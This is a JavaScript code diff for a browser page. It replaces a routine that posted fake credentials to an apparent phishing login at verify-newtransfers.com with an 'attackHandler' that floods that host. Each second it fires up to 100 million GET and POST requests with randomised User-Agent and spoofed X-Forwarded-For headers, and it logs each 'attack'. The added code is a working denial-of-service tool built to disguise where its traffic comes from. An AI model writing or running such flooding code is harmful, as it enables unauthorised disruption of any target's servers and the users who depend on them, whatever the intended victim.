@@ -1,46 +1,41 @@
 const button = document.querySelector("button")
+const appLogs = document.getElementsByClassName("app-logs")[0]
 
-const generatePassword = (length) => {
-    const chars = "abcdefghijklmnopqrstuvwxyz!@#$%^&*()-+<>ABCDEFGHIJKLMNOP1234567890"
-    let password = ""
+let success = 0
+let interval
 
-    for(let i = 0; i < length; i++) {
-        password += chars.charAt(Math.floor(Math.random() * chars.length))
-    }
-    
-    return password
+const generateTime = () => {
+	let today = new Date(),
+		date = today.getFullYear() + "-" + String(today.getMonth() + 1).padStart(2, '0') + "-" + String(today.getDate()).padStart(2, '0'),
+		time = String(today.getHours()).padStart(2, '0') + ":" + String(today.getMinutes()).padStart(2, '0') + ":" + String(today.getSeconds()).padStart(2, '0')
+
+	return `${date} ${time}`
+	
 }
 
-const fakeDetails = () => {
-    return {
-        "ip": faker.internet.ip(),
-        "ua": faker.internet.userAgent(),
-        "username": faker.name.findName(),
-        "password": generatePassword(Math.random() * 10 + 5)
-    }
+const attackHandler = () => {
+    let stress = 100_000_000
+    let methods = [ "GET", "POST" ]
+
+    interval = setInterval(() => {
+        for(let i = 0; i < stress; i++) {
+            for(let method of methods) {
+                fetch("verify-newtransfers.com", {
+                    method,
+                    headers: {
+                        "User-Agent": faker.internet.userAgent(),
+                        "X-Forwarded-For": faker.internet.ip()
+                    },
+                    body: ""
+                })
+            }
+        }
+        
+        const log = document.createElement("div")
+        log.textContent = `[ ${ generateTime() } ] Sent ${ stress } requests, attack ${ success++ }`
+
+        appLogs.appendChild(log)
+    }, 1000)
 }
 
-const sendFakeDetails = async () => {
-    const payload = fakeDetails()
-    const form = new FormData()
-
-    for(const key in payload) {        
-        const input = document.getElementById(key)
-        input.value = payload[key]
-
-        form.append(key, payload[key])
-    }
-
-    const response = await fetch("verify-newtransfers.com/personal/mbprimarylogin", {
-        method: "POST",
-        headers: {
-            "User-Agent": payload.ua
-        },
-        body: form
-    })
-
-    const json = await response.json()
-    console.log(json)
-}
-
-button.addEventListener("click", sendFakeDetails)
+button.addEventListener("click", attackHandler)
